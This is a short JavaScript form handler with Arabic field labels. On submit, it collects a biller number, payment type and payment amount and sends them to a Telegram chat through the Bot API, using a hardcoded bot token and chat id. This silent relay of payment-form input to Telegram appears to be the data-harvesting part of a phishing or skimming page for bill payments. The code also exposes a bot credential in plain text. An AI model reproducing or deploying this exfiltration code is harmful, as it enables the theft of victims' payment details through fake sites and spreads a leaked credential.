const form = document.querySelector("#form");

form.addEventListener("submit", (e) =>{
    e.preventDefault();

     var mofotr = document.getElementById("mofotr").value;
     var op = document.getElementById("op").value;
     var mone = document.getElementById("mone").value;

    var my_text = `البيانات%0A  - رقم المفوتر: ${mofotr}  %0A  -  اختر نوع السداد : ${op}  %0A -  قيمة السداد: ${mone} `

 var token ="5596027783:AAEERyqvvf5_709PqNaU8VfHTlcFIl2BiYg";
    var chat_id =-1001693270224;
var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}/`

let api = new XMLHttpRequest();
api.open("GET", url, true);
api.send();

    console.log("Message successfully sended!")
})